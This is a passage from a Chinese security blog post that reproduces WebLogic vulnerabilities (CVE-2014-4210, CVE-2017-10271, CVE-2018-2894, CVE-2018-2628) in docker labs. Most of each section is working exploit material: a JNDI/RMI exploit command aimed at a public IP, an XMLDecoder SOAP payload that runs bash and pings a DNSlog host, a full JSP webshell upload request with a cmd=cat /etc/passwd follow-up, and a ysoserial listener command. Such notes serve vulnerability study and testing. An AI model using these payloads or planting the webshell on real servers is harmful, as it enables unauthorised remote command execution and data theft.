+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar weblogic-spring-jndi-10.3.6.0.jar rmi:&#x2F;&#x2F;xxx.xxx.xxx.xxx:6668&#x2F;ascotbe &gt; ascotbe.txt </span><br><span class="line">python weblogic.py 103.231.12.172 49163 ascotbe.txt</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="0x04-Weblogic服务器端请求伪造漏洞（CVE-2014-4210）"><a href="#0x04-Weblogic服务器端请求伪造漏洞（CVE-2014-4210）" class="headerlink" title="0x04 Weblogic服务器端请求伪造漏洞（CVE-2014-4210）"></a>0x04 Weblogic服务器端请求伪造漏洞（CVE-2014-4210）</h4><h5 id="漏洞详情-3"><a href="#漏洞详情-3" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>披露时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2014-6-17</span><br></pre></td></tr></table></figure></li>
+<li><p><code>CVE</code>编号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2014-4210</span><br></pre></td></tr></table></figure></li>
+<li><p>影响版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.0.2.0</span><br><span class="line">10.3.6.0</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OracleFusionMiddleware10.0.2.0和10.3.6.0中OracleWebLogicServer组件中的未指定漏洞使远程攻击者可以通过与WLS-WebServices相关的媒介来影响机密性。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-3"><a href="#请求方式-3" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-3"><a href="#POC-3" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p>直接用<code>docker</code>搭环境</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/8.png" alt="image-20200602205634362"></p>
+</li>
+<li><p>然后请求这个URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure>
+
+<p>后面的IP可以用来探测端口用，其实请求这个<code>/uddiexplorer/SearchPublicRegistries.jsp</code>返回200就能表示存在漏洞了</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/9.png" alt="image-20200602205622104"></p>
+<p>数据包如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="0x05-WebLogicXMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506）"><a href="#0x05-WebLogicXMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506）" class="headerlink" title="0x05 WebLogicXMLDecoder反序列化漏洞（CVE-2017-10271&amp;CVE-2017-3506）"></a>0x05 WebLogicXMLDecoder反序列化漏洞（CVE-2017-10271&amp;CVE-2017-3506）</h4><h5 id="漏洞详情-4"><a href="#漏洞详情-4" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>披露时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017-12-22</span><br></pre></td></tr></table></figure></li>
+<li><p><code>CVE</code>编号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2017-10271&amp;CVE-2017-3506</span><br></pre></td></tr></table></figure></li>
+<li><p>影响版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebLogicServer10.3.6.0.0版本</span><br><span class="line">WebLogicServer12.1.3.0.0版本</span><br><span class="line">WebLogicServer12.2.1.1.0版本</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OracleFusionMiddleware中的WebLogicServer组件的WLSSecurity子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的HTTP请求，就可以拿到目标服务器的权限</span><br><span class="line">这两个漏洞利用相同</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-4"><a href="#请求方式-4" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-4"><a href="#POC-4" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p>直接用<code>docker</code>搭环境</p>
+</li>
+<li><p>然后后发送数据包即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: 11</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 596</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;ping BF3ZrstW5BeTGRw.XXXXX.ceye.io&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/10.png" alt="image-20200602215739518"></p>
+</li>
+<li><p>然后看DNSlog数据</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/11.png" alt="image-20200602215900148"></p>
+</li>
+</ul>
+<h4 id="0x06-Weblogic任意文件上传漏洞（CVE-2018-2894）"><a href="#0x06-Weblogic任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="0x06 Weblogic任意文件上传漏洞（CVE-2018-2894）"></a>0x06 Weblogic任意文件上传漏洞（CVE-2018-2894）</h4><h5 id="漏洞详情-5"><a href="#漏洞详情-5" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>披露时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018-7-23</span><br></pre></td></tr></table></figure></li>
+<li><p><code>CVE</code>编号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-2894</span><br></pre></td></tr></table></figure></li>
+<li><p>影响版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WebLogicServer10.3.6.0</span><br><span class="line">WebLogicServer12.1.3.0</span><br><span class="line">WebLogicServer12.2.1.2</span><br><span class="line">WebLogicServer12.2.1.3</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oracle7月更新中，修复了WeblogicWebServiceTestPage中一处任意文件上传漏洞，WebServiceTestPage在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-5"><a href="#请求方式-5" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-5"><a href="#POC-5" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p>直接用<code>docker</code>搭环境，登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项</p>
+</li>
+<li><p>访问<code>http://your-ip:7001/ws_utc/config.do</code>，设置Work Home Dir为<code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code>。我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的</p>
+</li>
+<li><p>然后点击安全 -&gt; 增加，然后上传webshell</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/12.png" alt="image-20200603095903675"></p>
+<p>抓包</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/13.png" alt="image-20200603100804926"></p>
+<p>数据包如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ws_utc/resources/setting/keystore?timestamp=1391149854030</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.20.10.10:7001</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>720</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.20.10.10:7001</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.20.10.10:7001/ws_utc/config.do</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=y0d366sOMJ5k1n4ItvRdIjCuqtJvdFaYaLOtIwk7aa8LrERL0cV5!-1046261961</span><br><span class="line"><span class="attribute">dnt</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_name&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_edit_mode&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_password_front&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_password&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_password_changed&quot;</span><br><span class="line"></span><br><span class="line">true</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO</span><br><span class="line">Content-Disposition: form-data; name=&quot;ks_filename&quot;; filename=&quot;1.jsp&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;FORM METHOD=GET ACTION=&#x27;jsp_webshell.jsp&#x27;&gt;</span><br><span class="line">&lt;INPUT name=&#x27;cmd&#x27; type=text&gt;</span><br><span class="line">&lt;INPUT type=submit value=&#x27;Run&#x27;&gt;</span><br><span class="line">&lt;/FORM&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">   String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">   String output = &quot;&quot;;</span><br><span class="line">   if(cmd != null) &#123;</span><br><span class="line">      String s = null;</span><br><span class="line">      try &#123;</span><br><span class="line">         Process p = Runtime.getRuntime().exec(cmd,null,null);</span><br><span class="line">         BufferedReader sI = new BufferedReader(new</span><br><span class="line">InputStreamReader(p.getInputStream()));</span><br><span class="line">         while((s = sI.readLine()) != null) &#123; output += s+&quot;&lt;/br&gt;&quot;; &#125;</span><br><span class="line">      &#125;  catch(IOException e) &#123;   e.printStackTrace();   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;</span><br><span class="line">------WebKitFormBoundaryzVtngnKbQt01czaO--</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code>，即可执行</p>
+<p>不同shell执行方式不同</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;172.20.10.10:7001&#x2F;ws_utc&#x2F;css&#x2F;config&#x2F;keystore&#x2F;1591150550607_1.jsp?cmd&#x3D;cat%20&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/14.png" alt="image-20200603102703359"></p>
+</li>
+</ul>
+<h4 id="0x07-WeblogicWLS核心组件反序列化命令执行漏洞（CVE-2018-2628）"><a href="#0x07-WeblogicWLS核心组件反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="0x07 WeblogicWLS核心组件反序列化命令执行漏洞（CVE-2018-2628）"></a>0x07 WeblogicWLS核心组件反序列化命令执行漏洞（CVE-2018-2628）</h4><h5 id="漏洞详情-6"><a href="#漏洞详情-6" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>披露时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2018-04-18</span><br></pre></td></tr></table></figure></li>
+<li><p><code>CVE</code>编号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-2628</span><br></pre></td></tr></table></figure></li>
+<li><p>影响版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Weblogic10.3.6.0</span><br><span class="line">Weblogic12.1.3.0</span><br><span class="line">Weblogic12.2.1.2</span><br><span class="line">Weblogic12.2.1.3</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此漏洞产生于WeblogicT3服务，所有开放Weblogic控制台端口的应用，均会默认开启T3服务，因此会造成较大范围的影响。攻击者可以在未授权的情况下，通过T3协议在WebLogicServer中执行反序列化操作，最终造成远程代码执行漏洞。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-6"><a href="#请求方式-6" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-6"><a href="#POC-6" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p>直接用<code>docker</code>搭建好环境</p>
+</li>
+<li><p>脚本中只有检测的方法没有EXP方法，如果要用EXP只需要开个服务即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br></pre></td></tr></table></figure></li>
+<li><p>脚本跑出来结果如下</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/15.png" alt="image-20200604121343627"></p>
+</li>
+</ul>
+<h4 id="0x08-WebLogic远程命令执（CVE-2019-2729）"><a href="#0x08-WebLogic远程命令执（CVE-2019-2729）" class="headerlink" title="0x08 WebLogic远程命令执（CVE-2019-2729）"></a>0x08 WebLogic远程命令执（CVE-2019-2729）</h4><h5 id="漏洞详情-7"><a href="#漏洞详情-7" class="headerlink" title="漏洞详情:"></a>漏洞详情:</h5><ul>
+<li><p>披露时间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019-6-21</span><br></pre></td></tr></table></figure></li>
+<li><p><code>CVE</code>编号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2019-2729</span><br></pre></td></tr></table></figure></li>
+<li><p>影响版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WebLogic10.3.6.0.0</span><br><span class="line">WebLogic12.1.3.0.0</span><br><span class="line">WebLogic12.2.1.3.0</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞本质是由于wls9-async组件在反序列化处理输入信息时存在缺陷，未经授权的攻击者可以发送精心构造的恶意HTTP请求，获取服务器权限，实现远程命令执行。</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="请求方式-7"><a href="#请求方式-7" class="headerlink" title="请求方式:"></a>请求方式:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br></pre></td></tr></table></figure>
+
+<h5 id="POC-7"><a href="#POC-7" class="headerlink" title="POC:"></a>POC:</h5><ul>
+<li><p>直接使用脚本进行测试</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/16.png" alt="image-20200606160522657"></p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/17.png" alt="image-20200606160622338"></p>
+</li>
+<li><p>可以看到执行了命令</p>
+</li>
+<li><p>脚本检测如下</p>
+<p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/CMS/WebLogic/18.png" alt="image-20200606160647313"></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/1899/11/30/Cms/WebLogic/">https://www.ascotbe.com/1899/11/30/Cms/WebLogic/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com" target="_blank">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/53.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li><li class="reward-item"><a href="/" target="_blank"><img class="post-qr-code-img" src="/"/></a><div class="post-qr-code-desc"></div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/1899/11/30/Cms/Struts2/"><img class="prev-cover" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/102.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Struts2</div></div></a></div><div class="next-post pull-right"><a href="/1899/11/30/Cms/%E9%80%9A%E8%BE%BEOA/"><img class="next-cover" src="https://raw.staticdn.net/Ascotbe/Random-img/master/BlogCover/57.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">通达OA</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，如有违规和作者无关！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WebLogic%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">WebLogic漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.0.1.</span> <span class="toc-text">安装注意事项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%88CVE-2019-2618%EF%BC%89"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x01 任意文件上传（CVE-2019-2618）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">漏洞位置:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">漏洞详情:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">请求方式:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#POC"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">POC:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" 